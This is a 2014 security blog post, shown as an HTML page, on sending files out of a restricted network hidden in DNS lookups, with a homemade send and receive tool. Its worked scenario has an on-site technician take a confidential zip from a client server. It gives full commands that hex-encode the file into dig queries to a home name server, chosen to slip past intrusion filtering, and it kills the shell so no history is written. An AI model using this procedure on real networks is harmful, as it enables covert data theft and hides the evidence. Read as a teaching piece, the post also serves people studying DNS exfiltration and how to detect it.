@@ -1,0 +1,538 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Dnsfilexfer - Yet Another Take on File Transfer via DNS - #!/slash/note</title>
+  <meta name="author" content="Leon Jacobs">
+
+  
+  <meta name="description" content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44457032-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">#!/slash/note</a></h1>
+  
+    <h2>A checkbox unchecker's notepad</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:leonjza.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Dnsfilexfer - Yet Another Take on File Transfer via DNS</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-11T06:10:00+02:00" pubdate data-updated="true">Mar 11<sup>th</sup>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>
+
+<h3>this article is not&hellip;</h3>
+
+<p>&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>
+
+<h2>the idea</h2>
+
+<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged &amp; formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>
+
+<p>Consider the following scenario.</p>
+
+<p>You have access to a very <em>secure</em> network. <em>Secure</em> in the sense that the firewalls are configured to allow <strong>NO</strong> outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this <em>secure</em> network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.</p>
+
+<p>You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, <code>z300_technical_diagrams.zip</code>. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.</p>
+
+<p>Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &lsquo;non-suspect&rsquo; DNS lookup requests.</p>
+
+<h2>the setup</h2>
+
+<p>So, to get the file <code>z300_technical_diagrams.zip</code> out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% dig A 123456.fake.com @127.0.0.1
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 123456.fake.com @127.0.0.1
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>;; Got answer:
+</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24059
+</span><span class='line'>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+</span><span class='line'>
+</span><span class='line'>;; QUESTION SECTION:
+</span><span class='line'>;123456.fake.com.    IN A
+</span><span class='line'>
+</span><span class='line'>;; ANSWER SECTION:
+</span><span class='line'>123456.fake.com.  60 IN A  127.0.0.1
+</span><span class='line'>
+</span><span class='line'>;; Query time: 0 msec
+</span><span class='line'>;; SERVER: 127.0.0.1#53(127.0.0.1)
+</span><span class='line'>;; WHEN: Tue Mar 11 07:55:31 2014
+</span><span class='line'>;; MSG SIZE  rcvd: 49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.</p>
+
+<h2>preparing the file</h2>
+
+<p>With comms working to our name server, we can get some information about the file and test if a hex dump tool like <code>xxd</code> is available. This will enable us to break the file up in to little parts that can be used as DNS questions.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% ls -lah z300_technical_diagrams.zip
+</span><span class='line'>-rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
+</span><span class='line'>% xxd -p z300_technical_diagrams.zip
+</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
+</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
+</span><span class='line'>e3523947e35275780b000104f50100000414000000504b03040a00000000
+</span><span class='line'>0049a938440000000000000000000000001b001c007068616e746f6d6a73
+</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great. It looks like we have everything we need to make this work. :)</p>
+
+<h2>&lsquo;transferring&rsquo; the file</h2>
+
+<p>Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% xxd -p z300_technical_diagrams.zip | awk '{ print "dig " $1 ".fake.io @127.0.0.1 +short" }'
+</span><span class='line'>dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
+</span><span class='line'>dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
+</span><span class='line'>dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
+</span><span class='line'>dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
+</span><span class='line'>dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
+</span><span class='line'>dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
+</span><span class='line'>dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
+</span><span class='line'>dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
+</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with <code>| sh</code> at the end, performing the actual lookups.
+On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.</p>
+
+<h2>back home</h2>
+
+<p>We close our bash session with <code>kill -9 $$</code> to prevent any history from writing and relogin, completing the original work we came for.</p>
+
+<p>Back home, it was time to stop the <code>tcpdump</code> that was running, and attempt to reassemble that file. The domain we used for the lookups was <code>fake.io</code>, so we just grep the output for that to ensure that we got the relevant parts (real ip&rsquo;s masked to 127.0.0.1):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io
+</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
+</span><span class='line'>19:31:32.919144 IP 127.0.0.1.49331 &gt; 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
+</span><span class='line'>19:31:32.925135 IP 127.0.0.1.51116 &gt; 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
+</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1
+</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
+</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
+</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
+</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lastly, we can pipe all of this through <code>xxd -r</code> and redirect the output to a new file. If all went well, this file <em>should</em> be <code>z300_technical_diagrams.zip</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r &gt; z300_technical_diagrams.zip
+</span><span class='line'>
+</span><span class='line'>% file z300_technical_diagrams.zip
+</span><span class='line'>z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>python all the things</h2>
+
+<p>Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the <code>dig</code> command to timeout, and it would retry like 3 times which would mean you would need to <code>uniq</code> your results before you <code>xxd -r</code> them.</p>
+
+<p>So, in order for me to <em>learn something new</em>, I figured I&rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o</p>
+
+<p>The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.</p>
+
+<h1>dnsfilexfer</h1>
+
+<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> &amp; <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>
+
+<p>The code can be <a href="https://github.com/th3l33k/dnsfilexfer">found here</a></p>
+
+<h2>sample usage</h2>
+
+<p>Below a full example of the usage, both on the client &amp; server:</p>
+
+<p>We start the &lsquo;server&rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted <code>-F</code> as we are not going to write the message to a file, yet.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
+</span><span class='line'>What is the secret?
+</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
+</span><span class='line'>%</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With our &lsquo;server&rsquo; started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% echo "This is a test message that will be sent over DNS\n Cool eh?" &gt; /tmp/message
+</span><span class='line'>% cat /tmp/message
+</span><span class='line'>This is a test message that will be sent over DNS
+</span><span class='line'>Cool eh?
+</span><span class='line'>
+</span><span class='line'>% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
+</span><span class='line'>What is the secret?
+</span><span class='line'>[INFO] Message is encypted with the secret
+</span><span class='line'>---START OF MESSAGE---
+</span><span class='line'>/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
+</span><span class='line'>---END OF MESSAGE---
+</span><span class='line'>[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 000638773d3d.fake.io
+</span><span class='line'>[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
+</span><span class='line'>[INFO] Message sent in 8 requests</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see that the message was &lsquo;sent&rsquo; using 8 requests and the <code>--START OF MESSAGE--</code> preview contains the encrypted version of our message.
+Looking at the server, we see that the message is received:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
+</span><span class='line'>Password:
+</span><span class='line'>What is the secret?
+</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
+</span><span class='line'>[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
+</span><span class='line'>[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
+</span><span class='line'>[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
+</span><span class='line'>[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
+</span><span class='line'>[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
+</span><span class='line'>[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
+</span><span class='line'>[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
+</span><span class='line'>[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
+</span><span class='line'>[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
+</span><span class='line'>[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
+</span><span class='line'>[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
+</span><span class='line'>[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
+</span><span class='line'>[INFO] Full resource record query was for: 000638773d3d.fake.io.
+</span><span class='line'>[INFO] Processing frame 000638773d3d
+</span><span class='line'>[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
+</span><span class='line'>[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
+</span><span class='line'>[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
+</span><span class='line'>[OK] Message was received in 8 requests
+</span><span class='line'>[INFO] Message has been decrypted with the configured secret
+</span><span class='line'>Message identifier: dns_message_test
+</span><span class='line'>
+</span><span class='line'>---START OF MESSAGE---
+</span><span class='line'>This is a test message that will be sent over DNS
+</span><span class='line'>Cool eh?
+</span><span class='line'>
+</span><span class='line'>---END OF MESSAGE---</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats <em>should</em> work just fine. <strong>HOWEVER</strong> Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.</p>
+
+<p>Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.</p>
+
+<h2>Some afterthoughts</h2>
+
+<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone&gt;.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>
+
+<h3>further reading</h3>
+
+<p><a href="https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  ">https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  </a>
+<a href="http://www.aldeid.com/wiki/File-transfer-via-DNS">http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-11T06:10:00+02:00" pubdate data-updated="true">Mar 11<sup>th</sup>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/dns/'>dns</a>, <a class='category' href='/blog/categories/file-transfer/'>file transfer</a>, <a class='category' href='/blog/categories/tools/'>tools</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/" title="Previous Post: /root/flag.txt - Solving the Relativity Vulnerable VM">&laquo; /root/flag.txt - Solving the Relativity Vulnerable VM</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">Dnsfilexfer - Yet Another Take on File Transfer via DNS</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure With a Infamous Bot</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/">KVM - Redirecting CentOS Kernel and Tty Output to a Virtual Serial Console</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/31/url-expansion-im-paranoid-like-that/">URL Expansion - I'm Paranoid Like That</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Leon Jacobs -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
